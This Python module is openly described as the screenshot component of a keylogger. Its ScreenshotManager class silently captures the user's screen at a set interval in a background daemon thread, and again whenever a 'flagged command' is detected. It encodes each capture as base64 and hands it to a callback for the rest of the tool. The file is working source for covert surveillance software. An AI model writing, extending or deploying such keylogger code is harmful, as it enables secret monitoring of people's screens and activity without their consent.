"""
Screenshot management module for the keylogger
Handles capturing and processing screenshots
"""

import pyautogui
import base64
from io import BytesIO
import threading
import time
from datetime import datetime
import os

class ScreenshotManager:
    def __init__(self, callback=None):
        """
        Initialize the screenshot manager
        
        Args:
            callback: Function to call when screenshots are taken
        """
        self.callback = callback
        self.screenshot_interval = 60  # Default interval in seconds
        self.auto_capture_enabled = False
        self.capture_on_flags = True
        self.running = False
        self.screenshot_thread = None
        
    def start_auto_capture(self, interval=None):
        """Start automatic screenshot capturing"""
        if interval:
            self.screenshot_interval = interval
            
        self.auto_capture_enabled = True
        self.running = True
        
        if not self.screenshot_thread or not self.screenshot_thread.is_alive():
            self.screenshot_thread = threading.Thread(target=self._auto_capture_loop)
            self.screenshot_thread.daemon = True
            self.screenshot_thread.start()
    
    def stop_auto_capture(self):
        """Stop automatic screenshot capturing"""
        self.auto_capture_enabled = False
        self.running = False
        
    def capture_screenshot(self, reason="manual"):
        """
        Capture a screenshot and return it as base64
        
        Args:
            reason: Reason for taking the screenshot
            
        Returns:
            dict: Screenshot data with timestamp and base64 image
        """
        try:
            # Capture screenshot
            screenshot = pyautogui.screenshot()
            
            # Convert to bytes
            buffered = BytesIO()
            screenshot.save(buffered, format="PNG")
            img_bytes = buffered.getvalue()
            
            # Convert to base64
            img_base64 = base64.b64encode(img_bytes).decode('utf-8')
            
            # Create result
            result = {
                "timestamp": datetime.now().isoformat(),
                "reason": reason,
                "image": img_base64
            }
            
            # Notify callback if provided
            if self.callback:
                self.callback("screenshot_taken", result)
                
            return result
            
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
            return None
    
    def _auto_capture_loop(self):
        """Background thread for automatic screenshot capture"""
        while self.running and self.auto_capture_enabled:
            self.capture_screenshot(reason="auto")
            time.sleep(self.screenshot_interval)
    
    def take_flagged_screenshot(self, flag_info):
        """
        Take a screenshot when a command is flagged
        
        Args:
            flag_info: Information about the flagged command
        """
        if self.capture_on_flags:
            screenshot = self.capture_screenshot(reason=f"flagged_command: {flag_info.get('command', 'unknown')}")
            if screenshot and self.callback:
                screenshot['related_flag'] = flag_info
                self.callback("flagged_screenshot", screenshot)
            return screenshot
        return None